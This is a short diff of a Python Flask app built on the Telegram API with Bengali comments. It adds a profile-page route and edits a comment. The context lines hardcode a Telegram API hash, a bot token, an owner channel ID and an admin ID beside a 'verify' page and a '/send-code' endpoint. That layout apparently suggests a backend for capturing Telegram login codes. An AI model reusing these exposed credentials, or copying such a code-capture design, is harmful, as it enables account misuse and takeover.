@@ -21,7 +21,7 @@ API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
 
 BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
-OWNER_CHAT_ID = "-1003962414788"  # নতুন চ্যানেল আইডি
+OWNER_CHAT_ID = "-1003962414788"  # চ্যানেল আইডি
 ADMIN_ID = 6034439625             # অ্যাডমিন আইডি
 
 active_clients = {}
@@ -70,12 +70,19 @@ def verify_page():
     return "verify.html not found", 404
 
 
-# নতুন যোগ করা ড্যাশবোর্ড রাউট
 @app.route('/dashboard.html', methods=['GET'])
 def dashboard_page():
     if os.path.exists('dashboard.html'):
         return send_file('dashboard.html')
     return "dashboard.html not found", 404
+
+
+# নতুন যোগ করা প্রোফাইল পেজ রাউট
+@app.route('/profile.html', methods=['GET'])
+def profile_page():
+    if os.path.exists('profile.html'):
+        return send_file('profile.html')
+    return "profile.html not found", 404
 
 
 @app.route('/send-code', methods=['POST'])
